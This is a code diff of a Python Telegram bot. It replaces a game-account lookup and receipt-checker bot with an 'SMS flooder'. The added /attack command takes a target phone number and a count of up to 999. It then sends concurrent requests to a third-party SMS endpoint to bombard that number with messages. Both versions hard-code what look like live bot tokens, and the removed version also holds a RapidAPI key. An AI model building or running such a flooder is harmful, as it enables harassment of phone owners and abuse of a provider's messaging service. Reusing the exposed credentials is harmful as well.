@@ -1,331 +1,117 @@
 import os
-import sys
-import re
-import time
-import hashlib
-import threading
-import requests
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from flask import Flask
+import asyncio
+import logging
+import aiohttp
+from aiogram import Bot, Dispatcher, executor, types
 
-# =====================================================================
-# RENDER PORT BINDING (FLASK WEB SERVER)
-# =====================================================================
-flask_app = Flask(__name__)
+# 📝 Logging စနစ်ဖွင့်ခြင်း
+logging.basicConfig(level=logging.INFO)
 
-@flask_app.route('/')
-def home():
-    return "PayX-MM Premium Core Server is Online"
+# 🔑 ကိုကိုပေးထားသည့် Bot Token ကို တိုက်ရိုက် သတ်မှတ်ခြင်း
+BOT_TOKEN = "8702294693:AAGF_mmGKAg7-mWBuAl34jevVtDJ0mZE8HU"
 
-def run_flask():
-    port = int(os.environ.get("PORT", 8000))
-    flask_app.run(host="0.0.0.0", port=port)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(bot)
 
-# =====================================================================
-# CONFIGURATION & TOKENS
-# =====================================================================
-BOT_TOKEN = "8761954371:AAE3NExXJOGJa1D3Lp1aN2t6F_yA8h2imOo"
-RAPIDAPI_KEY = "283b178159msh486932881be989fp157c27jsn617224a255da"
-RAPIDAPI_HOST = "id-game-checker.p.rapidapi.com"
+# 🌐 API Target Endpoint
+SMS_API_URL = "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms"
 
-bot = telebot.TeleBot(BOT_TOKEN)
-BRANDING = "PAYX-MM"
-HASH_FILE = "processed_slips.txt"
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🚀 ၁။ START COMMAND HANDLER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+@dp.message_handler(commands=['start', 'help'])
+async def send_welcome(message: types.Message):
+    welcome_text = (
+        "⚡ **PREMIUM SMS ASYNC FLASH FLOODER**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🤖 **Developer:** `Dominic`\n"
+        "🟢 **Core Status:** `READY TO LAUNCH`\n\n"
+        "🛠 **အသုံးပြုနည်းလမ်း:**\n"
+        "ရိုက်ရန် -> `/attack [ဖုန်းနံပါတ်] [အကြိမ်ရေ]`\n"
+        "📝 *ဥပမာ:* `/attack 0997xxxxxxx 50`\n"
+        "⚠️ *(အမြင့်ဆုံး အကြိမ် ၉၉၉ ထိ စွမ်းဆောင်နိုင်သည်)*\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🌌 *Engine fully tuned under Dominic Operations.*"
+    )
+    await message.answer(welcome_text, parse_mode="Markdown")
 
-def load_hashes():
-    if not os.path.exists(HASH_FILE):
-        return set()
-    with open(HASH_FILE, "r") as f:
-        return set(line.strip() for line in f if line.strip())
-
-def save_hash(img_hash):
-    PROCESSED_SLIPS.add(img_hash)
-    with open(HASH_FILE, "a") as f:
-        f.write(f"{img_hash}\n")
-
-PROCESSED_SLIPS = load_hashes()
-
-# =====================================================================
-# DYNAMIC TYPEWRITER HEADER LOOP ENGINE
-# =====================================================================
-HEADER_FRAMES = [
-    "P", "PA", "PAY", "PAYX", "PAYX-", "PAYX-M", "PAYX-MM",
-    "PAYX-MM", "PAYX-M", "PAYX-", "PAYX", "PAY", "PA", "P", ""
-]
-
-def persistent_header_loop(chat_id, message_id, base_text, markup):
-    frame_index = 0
-    while True:
-        try:
-            time.sleep(0.3)
-            current_frame = HEADER_FRAMES[frame_index]
-            full_content = f"--- [{current_frame}] ---\n{base_text}"
-            
-            bot.edit_message_text(
-                text=full_content,
-                chat_id=chat_id,
-                message_id=message_id,
-                parse_mode="Markdown",
-                reply_markup=markup
-            )
-            frame_index = (frame_index + 1) % len(HEADER_FRAMES)
-        except Exception:
-            break
-
-# =====================================================================
-# START COMMAND
-# =====================================================================
-def run_start_sequence(chat_id, message_id):
-    try:
-        frames = ["[P]", "[PA]", "[PAY]", "[PAYX]", "[PAYX-]", "[PAYX-M]", "[PAYX-MM]"]
-        for f in frames:
-            bot.edit_message_text(f, chat_id, message_id)
-            time.sleep(0.15)
-        time.sleep(0.3)
-        bot.edit_message_text(".", chat_id, message_id)
-    except Exception: pass
-
-    guide = "====================\n  MAIN CONTROL PANEL\n====================\n\nSelect target option to verify data:"
-    markup = InlineKeyboardMarkup()
-    btn_ml = InlineKeyboardButton("Mobile Legends", callback_data="info_ml")
-    btn_ff = InlineKeyboardButton("Free Fire", callback_data="info_ff")
-    btn_pubg = InlineKeyboardButton("PUBG Mobile", callback_data="info_pubg")
-    btn_coc = InlineKeyboardButton("Clash of Clans", callback_data="info_coc")
-    btn_slip = InlineKeyboardButton("Verify Receipt Slip", callback_data="info_slip")
-    
-    markup.row(btn_ml, btn_ff)
-    markup.row(btn_pubg, btn_coc)
-    markup.row(btn_slip)
-
-    try:
-        bot.edit_message_text(text=f"[PAYX-MM]\n\n{guide}", chat_id=chat_id, message_id=message_id, reply_markup=markup)
-        threading.Thread(target=persistent_header_loop, args=(chat_id, message_id, guide, markup), daemon=True).start()
-    except Exception: pass
-
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    sent_msg = bot.send_message(message.chat.id, ".")
-    threading.Thread(target=run_start_sequence, args=(message.chat.id, sent_msg.message_id), daemon=True).start()
-
-# =====================================================================
-# RAPIDAPI TERMINAL ROUTER
-# =====================================================================
-def call_game_api(game_type, target_id):
-    headers = {
-        "x-rapidapi-key": RAPIDAPI_KEY, 
-        "Content-Type": "application/json",
-        "x-rapidapi-host": RAPIDAPI_HOST
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# ⚡ ၂။ ASYNC REQUEST WORKER (တစ်ကြိမ်ချင်းစီ ပို့မည့် စက်ရုပ်ငယ်)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def send_single_sms(session, phone):
+    # API က တောင်းဆိုမည့် Parameter / Payload 
+    # (မှတ်ချက် - API ရဲ့ Form Data သတ်မှတ်ချက်ပေါ်မူတည်၍ phone သို့မဟုတ် mobile ဖြစ်နိုင်သည်)
+    payload = {
+        "phone": phone,
+        "mobile": phone
     }
-    
-    if game_type == "mlbb":
-        url = f"https://{RAPIDAPI_HOST}/mobile-legends/{target_id}"
-    elif game_type == "ff":
-        url = f"https://{RAPIDAPI_HOST}/ff-global/{target_id}"
-    elif game_type == "pubg":
-        url = f"https://{RAPIDAPI_HOST}/pubgm-global/{target_id}"
-    elif game_type == "coc":
-        url = f"https://{RAPIDAPI_HOST}/coc/{target_id}"
-        
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Android; 13; Mobile)",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
     try:
-        r = requests.get(url, headers=headers, timeout=12)
-        if r.status_code != 200: 
-            return None, f"Status {r.status_code}"
-        return r.json(), None
-    except Exception as e: 
-        return None, str(e)
+        async with session.post(SMS_API_URL, data=payload, headers=headers, timeout=5) as response:
+            if response.status == 200:
+                return True
+            return False
+    except Exception:
+        return False
 
-# =====================================================================
-# CALLBACK QUERY SYSTEM & TRUE FAST CLIPBOARD
-# =====================================================================
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data.startswith("copy_"):
-        copied_text = call.data.replace("copy_", "")
-        # show_alert=False ပြောင်းလိုက်ခြင်းဖြင့် OK နှိပ်စရာမလိုဘဲ တန်းကူးပေးသွားပါမည်
-        bot.answer_callback_query(call.id, text=f"Copied: {copied_text}", show_alert=False)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# 🔥 ၃။ ASYNC FLASH FLOOD ENGINE (အမြန်ဆုံး ၉၉၉ ကြိမ် ပို့မည့်စနစ်)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+@dp.message_handler(commands=['attack'])
+async def start_sms_flood(message: types.Message):
+    args = message.text.split()
+    if len(args) < 3:
+        await message.answer("💡 **Format မှားယွင်းနေပါသည်။**\n📝 အသုံးပြုပုံ: `/attack [ဖုန်းနံပါတ်] [အကြိမ်ရေ]`")
         return
 
-    bot.answer_callback_query(call.id)
-    
-    if call.data == "info_ml":
-        msg_text = "--- PAYX FORMAT ---\n  /ml [User_ID] ([Zone_ID])\n-------------------\n\nFormat Example:\n/ml 2112723799 (19915)"
-        sent = bot.send_message(call.message.chat.id, f"[PAYX-MM]\n\n{msg_text}", parse_mode="Markdown")
-        threading.Thread(target=persistent_header_loop, args=(call.message.chat.id, sent.message_id, msg_text, None), daemon=True).start()
-        
-    elif call.data == "info_ff":
-        msg_text = "--- PAYX FORMAT ---\n  /ff [Player_UID]\n-------------------\n\nFormat Example:\n/ff 3108721457"
-        sent = bot.send_message(call.message.chat.id, f"[PAYX-MM]\n\n{msg_text}", parse_mode="Markdown")
-        threading.Thread(target=persistent_header_loop, args=(call.message.chat.id, sent.message_id, msg_text, None), daemon=True).start()
-        
-    elif call.data == "info_pubg":
-        msg_text = "--- PAYX FORMAT ---\n  /pubg [Character_ID]\n-------------------\n\nFormat Example:\n/pubg 5204837417"
-        sent = bot.send_message(call.message.chat.id, f"[PAYX-MM]\n\n{msg_text}", parse_mode="Markdown")
-        threading.Thread(target=persistent_header_loop, args=(call.message.chat.id, sent.message_id, msg_text, None), daemon=True).start()
-        
-    elif call.data == "info_coc":
-        msg_text = "--- PAYX FORMAT ---\n  /coc [Player_Tag]\n-------------------\n\nFormat Example:\n/coc 20C0RVGL"
-        sent = bot.send_message(call.message.chat.id, f"[PAYX-MM]\n\n{msg_text}", parse_mode="Markdown")
-        threading.Thread(target=persistent_header_loop, args=(call.message.chat.id, sent.message_id, msg_text, None), daemon=True).start()
-        
-    elif call.data == "info_slip":
-        msg_text = "Please upload or forward the receipt screenshot image here."
-        sent = bot.send_message(call.message.chat.id, f"[PAYX-MM]\n\n{msg_text}", parse_mode="Markdown")
-        threading.Thread(target=persistent_header_loop, args=(call.message.chat.id, sent.message_id, msg_text, None), daemon=True).start()
-
-# =====================================================================
-# RECEIPT DUPLICATE CHECKER SYSTEM
-# =====================================================================
-@bot.message_handler(content_types=['photo'])
-def handle_slip_verification(message):
+    target_phone = args[1]
     try:
-        file_info = bot.get_file(message.photo[-1].file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-        img_hash = hashlib.md5(downloaded_file).hexdigest()
-        
-        if img_hash in PROCESSED_SLIPS:
-            ui_response = "--- DUPLICATE DETECTED ---\n\nWarning: This receipt is already registered in database."
-            sent = bot.reply_to(message, f"[PAYX-MM]\n\n{ui_response}")
-            threading.Thread(target=persistent_header_loop, args=(message.chat.id, sent.message_id, ui_response, None), daemon=True).start()
-        else:
-            save_hash(img_hash)
-            ui_response = f"--- VERIFICATION PASS ---\n\nClean transaction accepted.\n\nToken: `{img_hash[:12]}`"
-            sent = bot.reply_to(message, f"[PAYX-MM]\n\n{ui_response}", parse_mode="Markdown")
-            threading.Thread(target=persistent_header_loop, args=(message.chat.id, sent.message_id, ui_response, None), daemon=True).start()
-    except Exception as e:
-        bot.reply_to(message, f"System Error: {str(e)}")
-
-# =====================================================================
-# /COPY REPLY HANDLER (FAST RE-PASTE PATTERN)
-# =====================================================================
-@bot.message_handler(commands=['copy'])
-def handle_reply_copy(message):
-    if not message.reply_to_message or not message.reply_to_message.text:
-        return bot.reply_to(message, "Format Warning: Reply to any context message with /copy")
-    
-    target_text = message.reply_to_message.text
-    lines = [line.strip() for line in target_text.split('\n') if line.strip()]
-    
-    copy_markup = InlineKeyboardMarkup()
-    found_elements = []
-    monospace_text_block = ""
-
-    for raw_item in lines:
-        if "/copy" in raw_item.lower() or "payx" in raw_item.lower():
-            continue
-        sub_items = [s.strip("(),. ") for s in raw_item.split() if s.strip("(),. ")]
-        for item in sub_items:
-            if item and item not in found_elements and len(item) >= 2:
-                found_elements.append(item)
-                
-                # Switch inline query current chat ကိုသုံးပြီး နှိပ်လိုက်တာနဲ့ စာရိုက်ကွက်ထဲ Past တန်းဝင်စေရမည်
-                btn = InlineKeyboardButton(text=f"Copy: {item}", switch_inline_query_current_chat=item)
-                copy_markup.row(btn)
-                monospace_text_block += f"- `{item}`\n"
-                
-    if not found_elements:
-        return bot.reply_to(message, "Error: No extractable structures identified.")
-
-    base_copy_ui = f"--- TAP TEXT TO COPY ---\n\n{monospace_text_block}"
-    sent_msg = bot.reply_to(message.reply_to_message, f"[PAYX-MM]\n\n{base_copy_ui}", parse_mode="Markdown", reply_markup=copy_markup)
-    threading.Thread(target=persistent_header_loop, args=(message.chat.id, sent_msg.message_id, base_copy_ui, copy_markup), daemon=True).start()
-
-# =====================================================================
-# LOOKUP PARSER WITH FAST RE-PASTE PATTERN BUTTONS
-# =====================================================================
-def parse_and_send_result(message, game_type, target_id, extra_id=None):
-    api_query_id = f"{target_id}/{extra_id}" if extra_id else target_id
-    
-    status_msg = bot.reply_to(message, "Scanning mainframe matrix...")
-    result, error = call_game_api(game_type, api_query_id)
-    
-    if error:
-        bot.edit_message_text(f"Connection Error: {error}", message.chat.id, status_msg.message_id)
+        amount = int(args[2])
+    except ValueError:
+        await message.answer("❌ အကြိမ်ရေသည် ကိန်းဂဏန်း သီးသန့် ဖြစ်ရပါမည်။")
         return
-        
-    if result:
-        nickname = result.get("nickname") or result.get("username") or result.get("name")
-        if not nickname:
-            for key in ["data", "result"]:
-                if key in result and isinstance(result[key], dict):
-                    inner = result[key]
-                    nickname = inner.get("nickname") or inner.get("username") or inner.get("name")
-                    break
-        nickname = nickname or "Verified Player"
-        
-        country_info = "Not Found"
-        if game_type == "mlbb":
-            country_info = result.get("country") or result.get("region") or result.get("zone")
-            if not country_info:
-                for key in ["data", "result"]:
-                    if key in result and isinstance(result[key], dict):
-                        inner = result[key]
-                        country_info = inner.get("country") or inner.get("region") or inner.get("zone")
-                        break
-            
-            if not country_info or country_info == extra_id:
-                country_info = f"Global Server ({extra_id})"
-            
-        cool_ui = (
-            "-----------------------------\n"
-            "       PLAYER PROFILE        \n"
-            "-----------------------------\n"
-            f" User Name : `{nickname}`\n"
-            f" Player ID : `{target_id}`\n"
-        )
-        
-        if game_type == "mlbb":
-            cool_ui += f" Country   : `{country_info}`\n"
-            
-        cool_ui += (
-            "-----------------------------\n\n"
-            "Tap buttons below to copy & paste instantly:"
-        )
-        
-        # Switch Inline Query စနစ်သစ်ဖြင့် OK နှိပ်စရာမလိုဘဲ တန်းပြီး Past ချခိုင်းခြင်း
-        copy_markup = InlineKeyboardMarkup()
-        btn_copy_name = InlineKeyboardButton(text=f"Copy Name: {nickname}", switch_inline_query_current_chat=nickname)
-        btn_copy_id = InlineKeyboardButton(text=f"Copy ID: {target_id}", switch_inline_query_current_chat=target_id)
-        
-        copy_markup.row(btn_copy_name)
-        copy_markup.row(btn_copy_id)
-        
-        bot.edit_message_text(f"[PAYX-MM]\n\n{cool_ui}", message.chat.id, status_msg.message_id, parse_mode="Markdown", reply_markup=copy_markup)
-        
-        threading.Thread(
-            target=persistent_header_loop, 
-            args=(message.chat.id, status_msg.message_id, cool_ui, copy_markup), 
-            daemon=True
-        ).start()
 
-# =====================================================================
-# COMMANDS ROUTING
-# =====================================================================
-@bot.message_handler(commands=['ml'])
-def handle_ml(message):
-    match = re.search(r'/ml\s+(\d+)\s*\((.*?)\)', message.text)
-    if not match: return bot.reply_to(message, "Format Warning: Use /ml 2112723799 (19915)")
-    parse_and_send_result(message, "mlbb", match.group(1), match.group(2).strip())
+    # အမြင့်ဆုံး ၉၉၉ ကြိမ် ကန့်သတ်ချက်
+    if amount > 999:
+        amount = 999
+    elif amount < 1:
+        await message.answer("❌ အကြိမ်ရေသည် အနည်းဆုံး ၁ ကြိမ် ဖြစ်ရပါမည်။")
+        return
 
-@bot.message_handler(commands=['ff'])
-def handle_ff(message):
-    args = message.text.split()
-    if len(args) < 2: return bot.reply_to(message, "Format Warning: Use /ff [UID]")
-    parse_and_send_result(message, "ff", args[1])
+    status_msg = await message.answer(f"🚀 **ATTACK INITIALIZED...**\n🎯 **Target:** `{target_phone}`\n📊 **Payload Volume:** `{amount} Requests`")
 
-@bot.message_handler(commands=['pubg'])
-def handle_pubg(message):
-    args = message.text.split()
-    if len(args) < 2: return bot.reply_to(message, "Format Warning: Use /pubg [ID]")
-    parse_and_send_result(message, "pubg", args[1])
+    # Async Http Session ဖွင့်လှစ်ပြီး အပြိုင်ပို့ခြင်း (Concurrent Tasks)
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(amount):
+            tasks.append(send_single_sms(session, target_phone))
+        
+        # ရှိသမျှ Task ၉၉၉ ခုလုံးကို Cloud ပေါ်ကနေ တစ်ပြိုင်နက် ဆောင့်ပစ်ခြင်း
+        results = await asyncio.gather(*tasks)
+        
+        # အောင်မြင်မှု ရလဒ် တွက်ချက်ခြင်း
+        success_count = sum(1 for res in results if res)
+        failed_count = amount - success_count
 
-@bot.message_handler(commands=['coc'])
-def handle_coc(message):
-    args = message.text.split()
-    if len(args) < 2: return bot.reply_to(message, "Format Warning: Use /coc [Tag]")
-    player_tag = args[1].replace("#", "").strip()
-    parse_and_send_result(message, "coc", player_tag)
+    # UI အဆုံးသတ် ရလဒ် ထုတ်ပြန်ခြင်း
+    final_ui = (
+        "⚡ **SMS FLASH ATTACK COMPLETED**\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 **Target Node:** `{target_phone}`\n"
+        f"🚀 **Total Transmitted:** `{amount} Packets`\n"
+        f"🟢 **Delivered Success:** `{success_count}`\n"
+        f"🔴 **Dropped/Blocked:** `{failed_count}`\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🛰️ *Status: NODE INFILTRATION CONCLUDED BY DOMINIC*"
+    )
+    await bot.edit_message_text(final_ui, message.chat.id, status_msg.message_id, parse_mode="Markdown")
 
-if __name__ == "__main__":
-    threading.Thread(target=run_flask, daemon=True).start()
-    bot.infinity_polling()
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# ⚙️ BOT PROCESS TRIGGER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+if __name__ == '__main__':
+    print("--- Dominic SMS Flooder Engine Online ---")
+    executor.start_polling(dp, skip_updates=True)
